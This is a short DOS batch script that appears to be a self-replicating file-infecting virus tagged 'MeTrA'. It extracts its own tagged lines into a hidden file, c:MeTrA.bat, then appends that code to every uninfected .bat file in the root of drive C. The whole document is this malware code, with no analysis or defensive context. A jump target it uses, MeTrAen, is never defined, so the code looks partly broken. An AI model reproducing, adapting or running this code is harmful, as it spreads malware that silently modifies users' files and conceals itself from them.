@echo off%[MeTrA]% 
if '%1=='In_ goto MeTrAin 
if exist c:MeTrA.bat goto MeTrAru 
if not exist %0 goto MeTrAen 
find "MeTrA"<%0>c:MeTrA.bat 
attrib +h c:MeTrA.bat 
:MeTrAru 
for %%t in (C:\*.bat) do call c:MeTrA In_ %%t 
goto MeTrAen 
:MeTrAin 
find "MeTrA"<%2>nul 
if not errorlevel 1 goto MeTrAen 
type c:MeTrA.bat>>%2
exit